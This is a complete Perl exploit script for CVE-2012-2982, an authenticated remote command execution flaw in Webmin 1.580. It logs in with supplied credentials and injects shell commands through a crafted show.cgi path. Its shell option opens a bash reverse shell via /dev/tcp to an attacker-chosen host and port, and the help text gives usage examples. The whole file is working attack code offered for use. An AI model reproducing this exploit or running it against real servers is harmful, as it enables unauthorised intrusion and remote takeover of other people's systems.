#!/usr/bin/env perl

# Exploit for CVE-2012-2982 (Authenticated RCE in Webmin 1.580)
# Code by LvMalware (https://github.com/lvmalware)

use strict;
use warnings;
use File::Spec;
use HTTP::Tiny;
use URI::Escape;
use MIME::Base64;
use Getopt::Long qw(:config no_ignore_case);

sub post {
    my ($url, $cookie, %params) = @_;
    my $http = HTTP::Tiny->new(max_redirect => 1);
    $http->post_form( $url, \%params, { headers => { Cookie => $cookie } } );
}

sub run_command {
    my ($target, $cookie, $command) = @_;
    $command = uri_escape($command);
    my $rnd = join '', map { chr(65 + rand(26)) } 1 .. 3+rand(5);
    my $resp = post("$target/file/show.cgi/bin/$rnd%7c$command%7c", $cookie);
    $resp->{status} == 200 # && $resp->{reason} =~ /Document follows/;
}

sub login_check {
    my ($target, $username, $password) = @_;
    print "[*] Trying to log in               ";
    $| ++;
    my $resp = post(
        "$target/session_login.cgi",
        "testing=1",
        user => $username,
        pass => $password,
        page => "/",
    );
    my $cookie = "";
    if ($resp->{status} == 302 && $resp->{headers}->{'set-cookie'} =~ /sid=([^;&]+)/) {
        print "[OK]\n";
         $cookie = "sid=$1";
    } else {
        print "[ERROR]\n";
        print "[!] Couldn't log in... are these credentials valid?\n";
        return $cookie;
    }

    print "[*] Checking for exploitability    ";
    $| ++;
    if (run_command($target, $cookie, "echo qwertyuiop")) {
        print "[OK]\n";
        return $cookie;
    }
    print "[ERROR]\n";
    print "[!] The system doesn't seem vulnerable\n";
    ""
}

sub exploit {
    my ($target, $cookie, $cmd) = @_;
    print "[*] Trying to run command          ";
    $| ++;
    if (run_command($target, $cookie, $cmd)) {
        print "[OK]\n";
        return 1;
    }
    print "[ERROR]\n";
    print "[!] Something went wrong while running this command\n";
    0
}

sub help {
    print <<HELP;
$0 - Exploit for CVE-2012-2982 (Authenticated RCE in Webmin 1.580)
Usage: $0 [options]

Options:
    -h, --help          Show this help message
    -t, --target        The target to attack (ex: http://server.address:port)
    -c, --command       Command to be executed on the target
    -s, --shell         Try getting a reverse shell
    -l, --lhost         Address to send the reverse shell to
    -p, --lport         Port to which the reverse shell should connect
    -U, --username      Username for the webmin application
    -P, --password      Password for the webmin application

Example:
    $0 -t https://192.168.0.10:10000 -s -l 192.168.0.2 -p 1234 -U admin -P admin
    $0 -t http://target.server -c 'ping -c1 my.server' -U admin -P admin
    ...

HELP
    exit 0;
}

sub main {
    my ($target, $command, $shell, $lhost, $lport, $user, $pass);
    GetOptions(
        "h|help"        => \&help,
        "t|target=s"    => \$target,
        "c|command=s"   => \$command,
        "s|shell"       => \$shell,
        "l|lhost=s"     => \$lhost,
        "p|lport=i"     => \$lport,
        "U|username=s"  => \$user,
        "P|password=s"  => \$pass,
    ) || die "[!] Something went very wrong";
    
    help() unless $target || $command || ($shell && $lhost && $lport);
    help() unless $user && $pass;
    #no annoying erros messing with the terminal
    open STDERR, '>', File::Spec->devnull(); 
    $target = "http://$target" unless ($target =~ /https?:\/\//i);
    $command = "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0<&1'" if $shell;
    if (my $cookie = login_check($target, $user, $pass)) {
        exploit($target, $cookie, $command);
    }
    0;
}

exit main unless caller
